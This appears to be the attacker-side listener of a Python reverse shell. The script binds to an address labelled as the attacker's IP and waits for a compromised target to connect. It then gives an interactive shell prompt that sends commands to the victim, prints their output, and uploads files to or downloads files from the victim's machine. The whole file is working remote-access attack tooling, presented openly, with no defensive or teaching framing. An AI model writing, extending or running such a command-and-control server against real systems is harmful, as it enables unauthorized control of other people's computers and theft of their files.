import socket
import json
import argparse
import signal
import os

# Global variable to track if SIGINT signal has been received
exit_program = False

def sigint_handler(signal, frame):
    global exit_program
    print("\nSIGINT detected. Exiting...")
    exit_program = True
    return

def reliable_send(sock, data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode()) 
    return

def reliable_recv(sock):
    global exit_program
    data = ''
    while not exit_program:
        try:
            sock.settimeout(10)
            chunk = sock.recv(4096).decode().rstrip()
            data += chunk
            return json.loads(data)
        except:
            continue
    return

def download_file(sock, filename):

    with open(filename, 'wb') as f:
        sock.settimeout(1)
        try:
            chunk = sock.recv(1024)
        except socket.timeout:
            sock.settimeout(None)
            return
        while chunk:
            f.write(chunk)
            try:
                chunk = sock.recv(1024)
            except socket.timeout:
                break
        sock.settimeout(None)


def upload_file(sock, filename):
    try:
        with open(filename, 'rb') as f:
            sock.send(f.read())
    except:
        sock.send(bytes('No such file', 'utf-8'))
        return



def target_communication(sock, ip):
    global exit_program

    while not exit_program:
        command = input(f'* Shell~{ip}: ')
        command_split = command.split(' ')

        if command_split[0] == 'upload':
            toupload = ''.join(command_split[1:])
            if os.path.exists(toupload):
                reliable_send(sock, command)
                upload_file(sock, toupload)
                continue
            else:
                print('No such file: ', toupload)
                continue
                
        reliable_send(sock, command)
        if command_split[0] == 'download':
            todownload = ''.join(command_split[1:])
            download_file(sock, todownload)
        elif command_split[0] == 'quit':
            break
        elif command_split[0] == 'cd':
            pass
        elif command_split[0] == 'clear':
            os.system('clear')
        else:
            result = reliable_recv(sock)
            print(result)

    return

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='TCP Server')
    parser.add_argument('-i', '--ip', type=str, help='Attackers IP address - REQUIRED', required=True)
    parser.add_argument('-p', '--port', type=int, help='port number - REQUIRED', required=True)
    args = parser.parse_args()

    # Register SIGINT signal handler
    signal.signal(signal.SIGINT, sigint_handler)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((args.ip, args.port))
    
    print(f'Listening on {args.ip}:{args.port}... ')
    sock.listen(5)

    target, ip = sock.accept()
        
    print(f'Connected from {ip}. \n\nType quit to exit')

    target_communication(target, ip)

    sock.close()
    print("Socket closed! Exit OK")